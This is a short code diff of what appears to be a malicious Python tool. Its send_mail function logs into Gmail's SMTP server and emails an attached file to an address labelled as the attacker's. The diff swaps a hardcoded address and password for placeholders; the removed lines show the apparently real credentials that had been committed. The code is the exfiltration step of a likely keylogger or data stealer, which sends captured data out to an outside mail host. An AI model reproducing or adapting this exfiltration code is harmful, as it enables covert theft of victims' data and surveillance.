@@ -17,8 +17,8 @@ def is_internet_connected():
 
 def send_mail():
     try:
-        _from = 'testpurpose028@gmail.com'
-        to = 'testpurpose028@gmail.com'
+        _from = '<attacker mail address>'
+        to = '<attacker mail address>'
         msg = MIMEMultipart()
         msg['_from'] = _from
         msg['To'] = to
@@ -34,7 +34,7 @@ def send_mail():
         msg.attach(py)
         s = smtplib.SMTP('smtp.gmail.com', 587)
         s.starttls()
-        s.login(_from, '!@#$%^&*(cd#@%sdfsrW#RQ#R@#)!@#$%^&*(#$#@$%$%)')
+        s.login(_from, '<password>')
         text = msg.as_string()
         s.sendmail(_from, to, text)
         s.quit()
